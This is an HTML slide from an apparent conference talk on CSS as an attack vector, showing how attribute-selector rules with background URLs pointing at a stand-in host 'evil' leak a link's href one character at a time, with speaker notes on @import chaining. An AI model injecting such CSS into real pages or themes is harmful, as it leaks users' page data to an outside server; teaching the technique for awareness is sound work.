@@ -1,0 +1,43 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8">
+<title>19 / 37 - CSS as an Attack Vector</title>
+<style>
+  html,body{ margin:0; padding:0; background:#000; }
+  section{ position:relative; width:1920px; height:1080px; overflow:hidden; box-sizing:border-box; }
+  section aside{ display:none; }
+  body{ position:relative; width:1920px; height:1080px; }
+  .nav a{ position:absolute; bottom:20px; display:inline-block; padding:10px 18px;
+           background:#0c0f14; color:#e8ecf1; border:1px solid #2a313c; border-radius:10px;
+           font-family:monospace; font-size:20px; text-decoration:none; }
+  .nav a:hover{ border-color:#6fd3c6; }
+  .nav .prev{ left:24px; }
+  .nav .next{ right:24px; }
+  .nav .count{ left:912px; width:96px; text-align:center; color:#8b97a3; }
+</style>
+</head><body>
+<section id="demo1" data-transition="fade" style="background:#1B2029;color:#E8ECF1;font-family:'IBM Plex Sans', Arial, sans-serif;padding:88px 112px;display:flex;flex-direction:column;gap:24px">
+<div style="display:flex;flex-direction:column;gap:8px">
+<p style="font-family:'JetBrains Mono', monospace;font-size:24px;font-weight:500;letter-spacing:1px;color:#6FD3C6">DEMO &middot; stealing a link from melbcss.com</p>
+<h2 style="font-size:56px;font-weight:600;line-height:1.05">Leaking an <i>href</i> with nothing but selectors</h2>
+</div>
+<div style="display:flex;gap:28px;align-items:stretch">
+<div style="flex:1;background:#0C0F14;border:1px solid #2A313C;border-radius:14px;padding:32px;display:flex;flex-direction:column;gap:12px">
+<p style="font-family:'JetBrains Mono', monospace;font-size:21px;color:#6B7684">the target on the page</p>
+<p style="font-family:'JetBrains Mono', monospace;font-size:24px;line-height:1.5;color:#C2CCD6">&lt;a class=&quot;link-button&quot;<br>&nbsp;&nbsp;href=&quot;https://github.com/<span style="color:#6FD3C6">melbcssmeetup</span>&quot;&gt;<br>&nbsp;&nbsp;Follow on GitHub<br>&lt;/a&gt;</p>
+</div>
+<div style="flex:1;background:#0C0F14;border:1px solid #2A313C;border-radius:14px;padding:32px;display:flex;flex-direction:column;gap:12px">
+<p style="font-family:'JetBrains Mono', monospace;font-size:21px;color:#6B7684">the attacker's CSS (theme / injection)</p>
+<p style="font-family:'JetBrains Mono', monospace;font-size:22px;line-height:1.5;color:#8B97A3">a.link-button[href^=&quot;&hellip;/a&quot;]{background:url(//evil/?c=a)}<br>a.link-button[href^=&quot;&hellip;/l&quot;]{background:url(//evil/?c=l)}<br><span style="color:#FF8A7A">a.link-button[href^=&quot;&hellip;/m&quot;]{background:url(//evil/?c=m)}</span> <span style="color:#6FD3C6">&larr; matches</span></p>
+</div>
+</div>
+<p style="font-size:29px;line-height:1.4;color:#C2CCD6">Only the matching rule fetches its background &mdash; so the attacker's server learns the next character. Extend the known prefix, repeat: <b style="color:#E8ECF1;font-weight:600">m &rarr; me &rarr; mel &rarr; &hellip; &rarr; melbcssmeetup.</b></p>
+<p style="font-family:'JetBrains Mono', monospace;font-size:24px;color:#8B97A3;border-left:4px solid #6FD3C6;padding:4px 0 4px 28px">CSS can't loop, so it's one char per round &mdash; or chain <i>@import</i>s to do it in one shot. Blind CSS exfiltration, PortSwigger has the full PoC.</p>
+<aside>Concrete demo tied to their own site &mdash; very effective. Walk it slowly: each rule says "if the href starts with this prefix, fetch my background image." Only the rule whose next character is correct generates a box with a background, so only it hits the attacker's server, revealing that character. You then re-inject with the prefix extended by the known char and recover the next one. Be honest about the caveat on the last line: pure CSS has no loop, so naively it's one network round per character; real attacks use recursive @import chaining (Pepe Vila / PortSwigger "Blind CSS Exfiltration") to pull many characters per load. This needs attacker-controlled CSS on the page &mdash; e.g. a malicious community theme. Offer to show the live PortSwigger PoC repo in Q&A. ~70 seconds. If you want a real working demo later, I can build a tiny self-contained HTML page that does this against a local element.</aside>
+</section>
+<div class="nav">
+<a class="prev" href="slide-18.html">&lsaquo; Prev</a>
+<a class="count" href="index.html">19 / 37</a>
+<a class="next" href="slide-20.html">Next &rsaquo;</a>
+</div>
+</body></html>
